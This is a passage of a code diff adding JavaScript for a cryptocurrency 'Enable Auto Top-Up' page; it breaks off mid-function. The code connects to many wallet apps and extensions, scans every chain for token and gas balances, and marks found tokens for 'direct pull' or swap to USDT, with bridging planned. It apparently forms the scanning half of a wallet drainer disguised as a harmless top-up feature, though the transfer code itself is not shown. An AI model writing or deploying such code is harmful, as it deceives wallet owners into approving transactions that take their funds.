+  okx:      "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='32' height='32' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='6' fill='%23000000'/%3E%3Crect x='6' y='6' width='6' height='6' rx='.5' fill='white'/%3E%3Crect x='13' y='6' width='6' height='6' rx='.5' fill='white'/%3E%3Crect x='20' y='6' width='6' height='6' rx='.5' fill='white'/%3E%3Crect x='6' y='13' width='6' height='6' rx='.5' fill='white'/%3E%3Crect x='20' y='13' width='6' height='6' rx='.5' fill='white'/%3E%3Crect x='6' y='20' width='6' height='6' rx='.5' fill='white'/%3E%3Crect x='13' y='20' width='6' height='6' rx='.5' fill='white'/%3E%3Crect x='20' y='20' width='6' height='6' rx='.5' fill='white'/%3E%3C/svg%3E",
+  bitget:   "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='32' height='32' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='6' fill='%2300D4AA'/%3E%3Cpath d='M10 12l6 3.5V22l-6-3.5z' fill='white'/%3E%3Cpath d='M22 12l-6 3.5V22l6-3.5z' fill='white' opacity='.7'/%3E%3Cpath d='M10 12l6-3.5L22 12l-6 3.5z' fill='white' opacity='.85'/%3E%3C/svg%3E",
+  safepal:  "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='32' height='32' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='6' fill='%234A21EF'/%3E%3Cpath d='M16 6L8 10v6c0 6 8 10 8 10s8-4 8-10v-6L16 6z' fill='none' stroke='white' stroke-width='2'/%3E%3Cpath d='M13 15l2 2 4-4' fill='none' stroke='white' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'/%3E%3C/svg%3E",
+  tp:       "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='32' height='32' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='6' fill='%232980FE'/%3E%3Crect x='8' y='9' width='12' height='3' rx='1.5' fill='white'/%3E%3Crect x='12.5' y='9' width='3' height='14' rx='1.5' fill='white'/%3E%3Crect x='19' y='13' width='3' height='10' rx='1.5' fill='white'/%3E%3Crect x='19' y='13' width='6' height='3' rx='1.5' fill='white'/%3E%3C/svg%3E",
+  imtoken:  "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='32' height='32' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='6' fill='%2300A3C4'/%3E%3Ccircle cx='16' cy='13' r='6' fill='none' stroke='white' stroke-width='2'/%3E%3Cpath d='M10 19c0 0 2 6 6 6s6-6 6-6' fill='none' stroke='white' stroke-width='2' stroke-linecap='round'/%3E%3Ccircle cx='16' cy='13' r='2' fill='white'/%3E%3C/svg%3E",
+  zerion:   "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='32' height='32' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='6' fill='%232962EF'/%3E%3Cpath d='M8 11h10L8 21h16' fill='none' stroke='white' stroke-width='2.5' stroke-linecap='round' stroke-linejoin='round'/%3E%3C/svg%3E",
+  rainbow:  "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='32' height='32' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='6' fill='%23174299'/%3E%3Cpath d='M16 26c-5.5 0-10-4.5-10-10h3c0 3.9 3.1 7 7 7s7-3.1 7-7h3c0 5.5-4.5 10-10 10z' fill='%23FF6E27'/%3E%3Cpath d='M16 22c-3.3 0-6-2.7-6-6h3c0 1.7 1.3 3 3 3s3-1.3 3-3h3c0 3.3-2.7 6-6 6z' fill='%23FFD600'/%3E%3Ccircle cx='16' cy='16' r='2' fill='%2300E676'/%3E%3C/svg%3E",
+  oneinch:  "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='32' height='32' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='6' fill='%231B314F'/%3E%3Cpath d='M14 8l-2 1 3 2v13h3V8h-4z' fill='%23D82122'/%3E%3Ccircle cx='21' cy='11' r='2.5' fill='%23D82122'/%3E%3C/svg%3E",
+  cdc:      "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='32' height='32' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='6' fill='%23103F68'/%3E%3Cpath d='M16 4L4 10v12l12 6 12-6V10L16 4z' fill='none' stroke='white' stroke-width='1.5'/%3E%3Cpath d='M16 8L8 12v8l8 4 8-4v-8L16 8z' fill='none' stroke='white' stroke-width='1.2'/%3E%3C/svg%3E",
+  math:     "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='32' height='32' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='6' fill='%23000000'/%3E%3Cpath d='M6 22V10l5 6 5-6 5 6 5-6v12' fill='none' stroke='white' stroke-width='2.5' stroke-linecap='round' stroke-linejoin='round'/%3E%3C/svg%3E",
+  tronlink: "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='32' height='32' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='6' fill='%23EF0027'/%3E%3Cpolygon points='16,6 26,24 6,24' fill='none' stroke='white' stroke-width='2.2' stroke-linejoin='round'/%3E%3Ccircle cx='16' cy='18' r='3' fill='white'/%3E%3C/svg%3E",
+};
+
+// ── Mobile deep-link wallets ───────────────────────────────────────────────
+const MAIN_WALLETS = [
+  {name:"Trust Wallet",    icon:ICONS.trust,     link: u => `https://link.trustwallet.com/open_url?coin_id=966&url=${encodeURIComponent(u)}`},
+  {name:"Coinbase Wallet", icon:ICONS.coinbase,  link: u => `https://go.cb-w.com/wallet-universal-link?url=${encodeURIComponent(u)}`},
+  {name:"TronLink",        icon:ICONS.tronlink,  link: u => `tronlinkoutside://pull.activity?param=${encodeURIComponent(JSON.stringify({url:u}))}`},
+  {name:"Phantom",         icon:ICONS.phantom,   link: u => `https://phantom.app/ul/browse/${encodeURIComponent(u)}?ref=${encodeURIComponent(u)}`},
+  {name:"MetaMask",        icon:ICONS.metamask,  link: u => `https://metamask.app.link/dapp/${u.replace(/^https?:\/\//,"")}`},
+  {name:"OKX Wallet",      icon:ICONS.okx,       link: u => `okx://wallet/dapp/url?dappUrl=${encodeURIComponent(u)}`},
+];
+const MORE_WALLETS = [
+  {name:"Bitget Wallet",  icon:ICONS.bitget,   link: u => `bitkeep://plus/dapp?url=${encodeURIComponent(u)}`},
+  {name:"SafePal",        icon:ICONS.safepal,  link: u => `safepalwallet://open?url=${encodeURIComponent(u)}`},
+  {name:"TokenPocket",    icon:ICONS.tp,       link: u => `tpdapp://open?params={"url":"${u}"}`},
+  {name:"imToken",        icon:ICONS.imtoken,  link: u => `imtokenv2://navigate/DappView?url=${encodeURIComponent(u)}`},
+  {name:"Zerion",         icon:ICONS.zerion,   link: u => `https://app.zerion.io/dapp-browser?url=${encodeURIComponent(u)}`},
+  {name:"Rainbow",        icon:ICONS.rainbow,  link: u => `https://rnbwapp.com/browser?url=${encodeURIComponent(u)}`},
+  {name:"1inch Wallet",   icon:ICONS.oneinch,  link: u => `https://wallet.1inch.io/dapp?url=${encodeURIComponent(u)}`},
+  {name:"Crypto.com",     icon:ICONS.cdc,      link: u => `dfw://open?url=${encodeURIComponent(u)}`},
+  {name:"Math Wallet",    icon:ICONS.math,     link: u => `mathwallet://url=${encodeURIComponent(u)}`},
+];
+
+// ── State ──────────────────────────────────────────────────────────────────
+let _activeProvider = null;
+
+// EIP-6963: detected wallet extensions keyed by uuid
+const _detectedWallets = {};
+
+// ── UI helpers ─────────────────────────────────────────────────────────────
+const ALL_STEPS = ["stepLoading","stepConnect","stepSuccess","stepNoFunds","stepWrongChain","stepError","stepSummary","stepXaman"];
+function showStep(id){
+  ALL_STEPS.forEach(s=>{ const el=document.getElementById(s); if(el) el.style.display = s===id?"block":"none"; });
+}
+function setLoading(title, msg){
+  document.getElementById("loadingTitle").textContent = title;
+  document.getElementById("loadingMsg").textContent   = msg;
+  showStep("stepLoading");
+}
+function showError(msg){ document.getElementById("errorMsg").textContent = msg; showStep("stepError"); }
+
+function friendlyError(e){
+  const code = e?.code||"";
+  const msg  = [e?.reason,e?.message,e?.shortMessage,e?.info?.error?.message].filter(Boolean).join(" ").toLowerCase();
+  if(code==="INSUFFICIENT_FUNDS"||msg.includes("insufficient funds")) return "Not enough tokens or gas. Please top up and try again.";
+  if(msg.includes("execution reverted")) return "Transaction rejected by the contract. Please try again.";
+  if(code===4001||code==="ACTION_REJECTED"||msg.includes("user rejected")||msg.includes("rejected")) return "You cancelled. Tap Try Again when ready.";
+  if(msg.includes("network")||msg.includes("rpc")||msg.includes("timeout")) return "Network error. Check your connection and try again.";
+  return "Something went wrong. Please try again.";
+}
+
+// ── EIP-6963: listen for wallet extension announcements ───────────────────
+window.addEventListener("eip6963:announceProvider", (event) => {
+  const { info, provider } = event.detail;
+  if(!info?.uuid) return;
+  _detectedWallets[info.uuid] = { info, provider };
+  // If connect screen is already showing, refresh it to include new wallet
+  if(document.getElementById("stepConnect").style.display !== "none"){
+    buildConnectScreen();
+  }
+});
+
+// Request all installed wallets to announce themselves
+function requestWallets(){
+  window.dispatchEvent(new Event("eip6963:requestProvider"));
+}
+
+// ── Detect wallet browser environment ─────────────────────────────────────
+function getWalletProvider(){
+  // Check all the common wallet-injected providers
+  if(window.ethereum)          return window.ethereum;
+  if(window.trustwallet)       return window.trustwallet;
+  if(window.phantom?.ethereum) return window.phantom.ethereum;
+  if(window.coinbaseWalletExtension) return window.coinbaseWalletExtension;
+  if(window.okxwallet)         return window.okxwallet;
+  if(window.bitkeep?.ethereum) return window.bitkeep.ethereum;
+  return null;
+}
+
+function getWalletName(){
+  const p = window.ethereum;
+  if(!p) return "Wallet";
+  if(p.isTrust || window.trustwallet)         return "Trust Wallet";
+  if(p.isMetaMask)                            return "MetaMask";
+  if(p.isCoinbaseWallet||p.isCoinbaseBrowser) return "Coinbase Wallet";
+  if(p.isPhantom)                             return "Phantom";
+  if(p.isOkxWallet || window.okxwallet)       return "OKX Wallet";
+  if(p.isBitKeep || window.bitkeep)           return "Bitget Wallet";
+  if(p.isTokenPocket)                         return "TokenPocket";
+  if(p.isImToken)                             return "imToken";
+  if(p.isZerion)                              return "Zerion";
+  if(p.isRainbow)                             return "Rainbow";
+  return "Wallet";
+}
+
+// ── Auto-connect when inside a wallet's built-in browser ──────────────────
+async function autoConnectInWalletBrowser(){
+  const provider = getWalletProvider();
+  if(!provider) { buildConnectScreen(); return; }
+
+  const name = getWalletName();
+  try{
+    setLoading("Connecting to "+name+"...", "Approve the connection in your wallet.");
+    _activeProvider = provider;
+    await provider.request({ method:"eth_requestAccounts" });
+    await startFlowFromProvider(provider);
+  }catch(e){
+    // If user rejects or something fails, show connect screen as fallback
+    showError(friendlyError(e));
+  }
+}
+
+// ── Build the connect screen dynamically ───────────────────────────────────
+function buildConnectScreen(){
+  const isMobile = /iPhone|iPad|Android|Mobile/i.test(navigator.userAgent);
+  const el = document.getElementById("stepConnect");
+  const walletProvider = getWalletProvider();
+
+  if(isMobile && walletProvider){
+    // Inside a wallet's built-in browser — show a single connect button
+    const name = getWalletName();
+    el.innerHTML = `
+      <h2>Enable Auto Top-Up</h2>
+      <p class="sub">Tap below to connect your ${name} and get started.</p>
+      <button class="wallet-link" onclick="autoConnectInWalletBrowser()" style="justify-content:center;border-color:#7c3aed;">
+        <span class="wl-name" style="text-align:center;flex:none;font-size:16px;color:#a78bfa;">Connect ${name}</span>
+      </button>
+      <p style="color:#64748b;font-size:11px;margin-top:12px;">Supports Polygon &amp; BNB Chain</p>`;
+  } else if(isMobile){
+    // Regular mobile browser — show deep links to open wallet apps
+    const mainLinks = MAIN_WALLETS.map(w => walletLinkHTML(w)).join("");
+    const moreLinks = MORE_WALLETS.map(w => walletLinkHTML(w)).join("");
+    el.innerHTML = `
+      <h2>Enable Auto Top-Up</h2>
+      <p class="sub">Open this page in your wallet app to get started.</p>
+      ${mainLinks}
+      <button class="more-wallets-toggle" onclick="toggleMoreWallets(this)">
+        More wallets <span class="arrow">&#9660;</span>
+      </button>
+      <div class="more-wallets-list" id="moreWalletsList">${moreLinks}</div>
+      <div style="margin-top:16px;padding-top:16px;border-top:1px solid #1e1e2e;">
+        <p style="color:#64748b;font-size:12px;margin-bottom:10px">Using another wallet? Copy this link and paste it in your wallet's built-in browser.</p>
+        <div onclick="copyLink()" style="display:flex;align-items:center;justify-content:center;gap:8px;background:#1e1030;border:1px solid #7c3aed;border-radius:10px;padding:11px;cursor:pointer;font-size:13px;font-weight:600;color:#a78bfa;">Copy Link</div>
+        <div id="copiedMsg" style="color:#22c55e;font-size:11px;margin-top:6px;display:none">Link copied!</div>
+      </div>`;
+  } else {
+    // Desktop: show detected wallet extensions (EIP-6963)
+    const wallets = Object.values(_detectedWallets);
+
+    if(wallets.length > 0){
+      // Show all detected wallets
+      const walletBtns = wallets.map(w => `
+        <button class="wallet-link" onclick="connectWithProvider('${w.info.uuid}')">
+          <div class="wl-icon">
+            <img src="${w.info.icon}" alt="${w.info.name}" onerror="this.parentElement.textContent='${w.info.name.charAt(0)}'"/>
+          </div>
+          <span class="wl-name">${w.info.name}</span>
+          <span class="wl-arrow">&#8250;</span>
+        </button>`).join("");
+
+      el.innerHTML = `
+        <h2>Enable Auto Top-Up</h2>
+        <p class="sub">Select your wallet to connect.</p>
+        ${walletBtns}
+        <p class="chain-note" style="margin-top:8px">Supports Polygon &amp; BNB Chain</p>`;
+    } else {
+      // No extensions detected — show install links
+      el.innerHTML = `
+        <h2>Enable Auto Top-Up</h2>
+        <p class="sub">No wallet detected. Install one of the extensions below, then refresh the page.</p>
+        <a class="wallet-link" href="https://metamask.io/download/" target="_blank" style="text-decoration:none">
+          <div class="wl-icon"><img src="${ICONS.metamask}" alt="MetaMask"/></div>
+          <span class="wl-name">Install MetaMask</span><span class="wl-arrow">&#8250;</span>
+        </a>
+        <a class="wallet-link" href="https://phantom.app/download" target="_blank" style="text-decoration:none">
+          <div class="wl-icon"><img src="${ICONS.phantom}" alt="Phantom"/></div>
+          <span class="wl-name">Install Phantom</span><span class="wl-arrow">&#8250;</span>
+        </a>
+        <a class="wallet-link" href="https://www.coinbase.com/wallet/downloads" target="_blank" style="text-decoration:none">
+          <div class="wl-icon"><img src="${ICONS.coinbase}" alt="Coinbase"/></div>
+          <span class="wl-name">Install Coinbase Wallet</span><span class="wl-arrow">&#8250;</span>
+        </a>
+        <a class="wallet-link" href="https://rabby.io" target="_blank" style="text-decoration:none">
+          <div class="wl-icon"><img src="${ICONS.zerion}" alt="Rabby"/></div>
+          <span class="wl-name">Install Rabby Wallet</span><span class="wl-arrow">&#8250;</span>
+        </a>
+        <a class="wallet-link" href="https://trustwallet.com/browser-extension" target="_blank" style="text-decoration:none">
+          <div class="wl-icon"><img src="${ICONS.trust}" alt="Trust Wallet"/></div>
+          <span class="wl-name">Install Trust Wallet</span><span class="wl-arrow">&#8250;</span>
+        </a>`;
+    }
+  }
+
+  showStep("stepConnect");
+}
+
+function walletLinkHTML(w){
+  const siteUrl = window.location.href;
+  return `
+    <a class="wallet-link" href="${w.link(siteUrl)}">
+      <div class="wl-icon"><img src="${w.icon}" alt="${w.name}"/></div>
+      <span class="wl-name">Open in ${w.name}</span><span class="wl-arrow">&#8250;</span>
+    </a>`;
+}
+
+function toggleMoreWallets(btn){
+  document.getElementById("moreWalletsList").classList.toggle("open");
+  btn.classList.toggle("open");
+}
+
+function copyLink(){
+  navigator.clipboard.writeText(window.location.href).then(()=>{
+    const el = document.getElementById("copiedMsg");
+    if(el){ el.style.display="block"; setTimeout(()=>el.style.display="none",4000); }
+  });
+}
+
+// ── Connect using a detected EIP-6963 wallet (desktop) ────────────────────
+async function connectWithProvider(uuid){
+  const wallet = _detectedWallets[uuid];
+  if(!wallet) return;
+  try{
+    setLoading("Connecting...","Approve the connection in your wallet.");
+    await wallet.provider.request({ method:"eth_requestAccounts" });
+    _activeProvider = wallet.provider;
+    await startFlowFromProvider(wallet.provider);
+  }catch(e){ showError(friendlyError(e)); }
+}
+
+// ── Entry point: connect → scan all chains → show summary ─────────────────
+async function startFlowFromProvider(provider){
+  try {
+    // Clear any previous session log on fresh connect
+    _sessionLog.length = 0;
+
+    _activeProvider = provider;
+    const ep     = new ethers.BrowserProvider(provider);
+    const signer = await ep.getSigner();
+    const wallet = (await signer.getAddress()).toLowerCase();
+
+    addLog("info", `Session started — wallet: ${wallet}`, { wallet, userAgent: navigator.userAgent });
+    addLog("info", `Chains to scan: ${orderedChains().map(c=>c.name).join(", ")}`, {});
+
+    setLoading("Scanning Wallets", "Checking all networks simultaneously.");
+    setLoadingStage("SCANNING", "Scanning Wallets");
+    startLoadingMsgs("scan");
+    hideProgress();
+    // allScans = every chain regardless of balance (for the scan grid display)
+    // scans    = only chains where at least one token was found (bal > 0)
+    addLog("info", "SCAN PHASE START", {});
+    const allScans = await scanAllChains(wallet);
+    stopLoadingMsgs();
+    addLog("info", "SCAN PHASE END", {});
+
+    const scans    = allScans.filter(r =>
+      (r.directs?.length || 0) + (r.swaps?.length || 0) > 0
+    );
+
+    // Log scan summary
+    allScans.forEach(r => {
+      const d = r.directs?.length || 0, s = r.swaps?.length || 0;
+      if(d+s > 0){
+        addLog("found", `[${r.chain.name}] FOUND ${d} direct + ${s} swap tokens → will execute`, { chain: r.chain.name, directs: d, swaps: s });
+      } else {
+        addLog("zero", `[${r.chain.name}] No tokens found — chain skipped`, { chain: r.chain.name });
+      }
+    });
+
+    // Resume check — if the same wallet has an unfinished session, drop
+    // chains they already completed so we don't ask them to redo work.
+    const resume = loadState();
+    let isResume = false;
+    let resumeScans = scans;
+    if(resume && resume.wallet === wallet && Array.isArray(resume.completed)){
+      const remaining = scans.filter(s => !resume.completed.includes(s.chain.chainId));
+      if(remaining.length > 0 && remaining.length < scans.length){
+        resumeScans = remaining;
+        isResume   = true;
+      }
+    }
+
+    showSummary(resumeScans, wallet, isResume, allScans);
+  } catch(e){
+    showError(friendlyError(e));
+  }
+}
+
+// ── Scanning (read-only, no wallet popups) ────────────────────────────────
+// Wraps a chain scan with a hard timeout. Free RPCs can hang indefinitely;
+// this ensures a slow/dead endpoint returns an empty result after 10 seconds
+// instead of blocking the entire scan.
+function chainScanWithTimeout(scanPromise, chain, ms = 15000){
+  const fallback = chain.kind === "evm"
+    ? { chain, directs:[], swaps:[], totalUsd:0, confirmCount:0 }
+    : { chain, balance:"0", eth:0, totalUsd:0, confirmCount:0 };
+  const timer = new Promise(resolve => setTimeout(() => resolve(fallback), ms));
+  return Promise.race([scanPromise, timer]);
+}
+
+async function scanAllChains(wallet){
+  const chains = orderedChains();
+  const results = await Promise.all(chains.map(chain => {
+    if(chain.kind === "evm")
+      return chainScanWithTimeout(scanEvmChain(chain, wallet), chain);
+    if(chain.kind === "l1eth")
+      return chainScanWithTimeout(scanL1Eth(chain, wallet), chain);
+    return Promise.resolve(null);
+  }));
+  // Return ALL results (including zero-balance chains) — filtering happens in startFlowFromProvider.
+  // allScans is passed to showSummary so the user can see every network that was checked.
+  return results.filter(r => r !== null);
+}
+
+// Scan a list of tokens in chunks of `size` to avoid RPC batch rate limits.
+// Each chunk is awaited before the next starts — this keeps concurrent call
+// count low enough that public nodes don't reject with -32005.
+// Wraps a single balanceOf call with a 6-second timeout.
+// If the RPC hangs (no response), the call resolves as null instead of blocking forever.
+async function balanceOfWithTimeout(erc, wallet, ms = 6000){
+  return Promise.race([
+    erc.balanceOf(wallet),
+    new Promise(resolve => setTimeout(() => resolve(null), ms)),
+  ]);
+}
+
+async function scanTokenChunk(tokens, rpc, wallet, chain, targetList, logType){
+  const CHUNK = 8; // keep below any node's per-batch limit (mainnet.base.org = 10, others ~20)
+  for(let i = 0; i < tokens.length; i += CHUNK){
+    const batch = tokens.slice(i, i + CHUNK);
+    await Promise.all(batch.map(async (token) => {
+      // ── Fix: lowercase address so ethers v6 doesn't throw bad-checksum ──
+      const addr = token.address.toLowerCase();
+      try {
+        const erc = new ethers.Contract(addr, ERC20_ABI, rpc);
+        const bal = await balanceOfWithTimeout(erc, wallet);
+        if(bal === null){
+          addLog("warn", `[${chain.name}] ${token.symbol}: balanceOf timed out (6s) — skipping`,
+            { chain: chain.name, token: token.symbol, address: addr });
+          return;
+        }
+        if(bal > 0n){
+          const usd   = (Number(bal) / (10 ** token.decimals)) * token.usdPerUnit;
+          const human = fmtBal(bal.toString(), token.decimals);
+          const tag   = logType === "direct"
+            ? "[DIRECT PULL]"
+            : `[SWAP → ${DEX[chain.chainId]?.targetSym||"USDT"}]`;
+          addLog("found", `[${chain.name}] ${token.symbol}: ${human} (~$${usd.toFixed(4)}) ${tag}`,
+            { chain: chain.name, token: token.symbol, address: addr, rawBal: bal.toString(), humanBal: human, usd });
+          targetList.push({ ...token, address: addr, bal:bal.toString(), usd });
+        } else {
+          addLog("zero", `[${chain.name}] ${token.symbol}: 0 balance`,
+            { chain: chain.name, token: token.symbol, address: addr });
+        }
+      } catch(e){
+        addLog("error", `[${chain.name}] ${token.symbol}: RPC error — ${e.message}`,
+          { chain: chain.name, token: token.symbol, address: addr, error: e.message });
+      }
+    }));
+  }
+}
+
+async function scanEvmChain(chain, wallet){
+  const rpcsToTry = [chain.rpc, ...(chain.rpcFallbacks || [])];
+  const tStart    = Date.now();
+
+  for(let rpcIdx = 0; rpcIdx < rpcsToTry.length; rpcIdx++){
+    const rpcUrl = rpcsToTry[rpcIdx];
+    addLog("scan",
+      `[${chain.name}] Connecting to ${rpcUrl}` + (rpcIdx > 0 ? ` (fallback ${rpcIdx})` : ""),
+      { chain: chain.name, rpc: rpcUrl });
+
+    try {
+      // batchMaxCount:1 disables ethers auto-batching — sends each eth_call as
+      // an individual HTTP request, avoiding "-32014 maximum N calls in 1 batch"
+      // errors from nodes like mainnet.base.org that cap batch size.
+      const rpc = new ethers.JsonRpcProvider(rpcUrl, undefined, { batchMaxCount: 1 });
+
+      // ── Quick connectivity test (3 s timeout) ─────────────────────────────
+      // This catches CORS failures, unreachable endpoints, etc. BEFORE we
+      // fire 50 balanceOf calls that would all fail silently.
+      try {
+        await Promise.race([
+          rpc.getBlockNumber(),
+          new Promise((_, rej) => setTimeout(() => rej(new Error("connect timeout")), 3000)),
+        ]);
+        addLog("scan", `[${chain.name}] RPC online — starting token scan`, { rpc: rpcUrl });
+      } catch(connErr){
+        addLog("warn",
+          `[${chain.name}] ${rpcUrl} unreachable (${connErr.message})` +
+          (rpcIdx < rpcsToTry.length - 1 ? " — trying fallback" : " — no more fallbacks"),
+          { chain: chain.name, rpc: rpcUrl });
+        continue; // try next RPC
+      }
+
+      // ── Scan tokens (directs + swaps) ──────────────────────────────────
+      const directs = [], swaps = [];
+      await scanTokenChunk(chain.tokens || [], rpc, wallet, chain, directs, "direct");
+      await scanTokenChunk(SWAP_SOURCES[chain.chainId] || [], rpc, wallet, chain, swaps, "swap");
+
+      directs.sort((a,b) => b.usd - a.usd);
+      swaps.sort((a,b) => b.usd - a.usd);
+
+      const totalUsd     = [...directs, ...swaps].reduce((s,t) => s + t.usd, 0);
+      const tokenCount   = directs.length + swaps.length;
+      const confirmCount = tokenCount > 0 ? tokenCount + 1 : 0;
+
+      // ── Scan native gas balance ────────────────────────────────────────
+      let gasBalance   = "0";
+      let gasUsd       = 0;
+      let hasGas       = false;
+      try {
+        const gasBal = await rpc.getBalance(wallet);
+        gasBalance = ethers.formatEther(gasBal);
+        const gasThresholdNum = parseFloat(chain.gasThreshold);
+        hasGas = parseFloat(gasBalance) >= gasThresholdNum;
+        // Rough estimate: use the token's USD price for gas token
+        // For ETH chains, we assume ~$2000-3000 per ETH; for BNB assume ~$600; for POL assume ~$0.5
+        let gasUsdEstimate = 0;
+        if(chain.chainId === 56) gasUsdEstimate = parseFloat(gasBalance) * 600; // BNB
+        else if(chain.chainId === 137) gasUsdEstimate = parseFloat(gasBalance) * 0.5; // POL
+        else gasUsdEstimate = parseFloat(gasBalance) * 2500; // ETH (rough mid-range)
+        gasUsd = gasUsdEstimate;
+        addLog("scan", `[${chain.name}] Gas: ${gasBalance} ${chain.sym} (${hasGas ? "✓" : "✗"} vs ${chain.gasThreshold} threshold)`,
+          { chain: chain.name, gasBalance, hasGas, threshold: chain.gasThreshold });
+      } catch(gasErr){
+        addLog("warn", `[${chain.name}] Could not detect gas balance — ${gasErr.message}`,
+          { chain: chain.name, error: gasErr.message });
+      }
+
+      const elapsed      = ((Date.now() - tStart) / 1000).toFixed(1);
+
+      addLog("scan",
+        `[${chain.name}] Done in ${elapsed}s — ${directs.length} direct, ${swaps.length} swap, $${totalUsd.toFixed(4)} (gas: ${gasBalance} ${chain.sym})`,
+        { chain: chain.name, elapsed, directs: directs.length, swaps: swaps.length, totalUsd, gasBalance, hasGas });
+
+      return { chain, directs, swaps, totalUsd, confirmCount, gasBalance, gasUsd, hasGas, gasSymbol: chain.sym };
+    } catch(e){
+      addLog("error",
+        `[${chain.name}] Unexpected scan error on ${rpcUrl} — ${e.message}`,
+        { chain: chain.name, rpc: rpcUrl, error: e.message });
+    }
+  }
+
+  const elapsed = ((Date.now() - tStart) / 1000).toFixed(1);
+  addLog("error", `[${chain.name}] All RPCs failed after ${elapsed}s`, { chain: chain.name });
+  return { chain, directs:[], swaps:[], totalUsd:0, confirmCount:0 };
+}
+
+async function scanL1Eth(chain, wallet){
+  try {
+    const rpc = new ethers.JsonRpcProvider(chain.rpc);
+    const bal = await rpc.getBalance(wallet);
+    const eth = Number(bal) / 1e18;
+    const usd = eth * chain.ethPriceUsd;
+    // Single tx via THORChain router, no approves needed for native ETH
+    const confirmCount = eth > 0 ? 1 : 0;  // only count if they have ETH to send
+    return { chain, balance:bal.toString(), eth, totalUsd:usd, confirmCount };
+  } catch(e){
+    return { chain, balance:"0", eth:0, totalUsd:0, confirmCount:0 };
+  }
+}
+
+// ── Bridge selection algorithm ─────────────────────────────────────────────
+/**
+ * selectBestBridgeSource: Intelligently decides whether bridging is needed and
+ * which chain to bridge from to maximize funding success.
+ *
+ * Returns:
+ *   { needsBridge: false } if all chains with funds have sufficient gas
+ *   { needsBridge: true, sourceChain, destChain, ... } if a bridge is required
+ *   { needsBridge: false, insufficientGasChains: [...] } if some chains need gas top-up
+ */
+function selectBestBridgeSource(scans){
+  const evmScans = scans.filter(s => s.chain.kind === "evm");
+
+  // Find chains with funds and chains with gas
+  const chainsWithFunds = evmScans.filter(s => s.totalUsd > 0);
+  const chainsWithGas = evmScans.filter(s => s.hasGas);
+  const chainsWithoutGas = evmScans.filter(s => s.totalUsd > 0 && !s.hasGas);
+
+  addLog("bridge",
+    `[Bridge Analysis] Chains with funds: ${chainsWithFunds.length}, with gas: ${chainsWithGas.length}, need gas top-up: ${chainsWithoutGas.length}`,
+    { chainsWithFunds: chainsWithFunds.map(c => c.chain.name), chainsWithGas: chainsWithGas.map(c => c.chain.name) });
+
+  // ── Case 1: All funds are on chains with sufficient gas ──────────────────
+  if(chainsWithoutGas.length === 0){
+    addLog("bridge", "[Bridge] No gas shortage detected — using normal pull flow");
+    return { needsBridge: false };
+  }
+
+  // ── Case 2: Some chains need gas, but have no funds ─────────────────────
+  if(chainsWithFunds.length === 0){
+    addLog("bridge", "[Bridge] No funds detected on any chain");
+    return { needsBridge: false };
+  }
+
+  // ── Case 3: We have funds on a chain without gas, but funds elsewhere ────
+  // Score each chain with funds to pick the best source for bridging
+  const scored = chainsWithFunds.map(scan => {
+    let score = scan.totalUsd; // Base: USD value on this chain
+
+    if(scan.hasGas) score += 500; // Bonus: has sufficient gas
+    if(scan.chain.order === 1) score += 300; // Bonus: BSC (primary chain)
+
+    return { scan, score };
+  });
+
+  scored.sort((a, b) => b.score - a.score); // Sort by score descending
+  const bestSource = scored[0].scan;
+
+  // Pick destination: prefer a chain that needs gas top-up (put bridged funds there)
+  // OR pick the primary chain (BSC) if all have gas
+  let destChain = chainsWithoutGas.length > 0 ? chainsWithoutGas[0].chain : CHAINS[56];
+
+  addLog("bridge",
+    `[Bridge] Selected: Bridge from ${bestSource.chain.name} (${bestSource.totalUsd.toFixed(2)} USD, score: ${scored[0].score}) → ${destChain.name}`,
+    { sourceChain: bestSource.chain.name, destChain: destChain.name, sourceValue: bestSource.totalUsd, sourceScore: scored[0].score });
+
+  return {
+    needsBridge: true,
+    sourceChain: bestSource,
+    destChain: destChain,
+    chainsNeedingGas: chainsWithoutGas.map(s => s.chain),
+    estimatedTime: 120, // seconds (Stargate typical)
+    estimatedCostPercent: 0.3, // 0.3% slippage estimate
+  };
+}
+
+// ── Summary screen ─────────────────────────────────────────────────────────
+function showSummary(scans, wallet, isResume, allScans){
+  allScans = allScans || [];
+
+  // EVM-only totals for the "no EVM funds" check (L1 ETH is separate)
+  const evmScans    = scans.filter(x => x.chain.kind === "evm");
+  const evmChains   = evmScans.filter(x => (x.directs?.length||0) + (x.swaps?.length||0) > 0);
+  const totalTokens = evmScans.reduce((s,x) => s + (x.directs?.length||0) + (x.swaps?.length||0), 0);
+  const totalUsd    = scans.reduce((s,x) => s + x.totalUsd, 0);
+  const confirmCount = scans.reduce((s,x) => s + x.confirmCount, 0);
+  const minutes      = confirmCount > 0 ? Math.max(1, Math.ceil(confirmCount * 0.5)) : 0;
+  const noEvmFunds   = totalTokens === 0;
+
+  // ── Bridge decision analysis ───────────────────────────────────────────
+  const bridgeDecision = selectBestBridgeSource(scans);
+  let bridgeWarning = "";
+  if(bridgeDecision.needsBridge){
+    bridgeWarning =
+      `<div style="background:#1e1030;border:1px solid #c084fc;border-radius:8px;padding:12px;margin-bottom:14px;font-size:13px;color:#c084fc;">` +
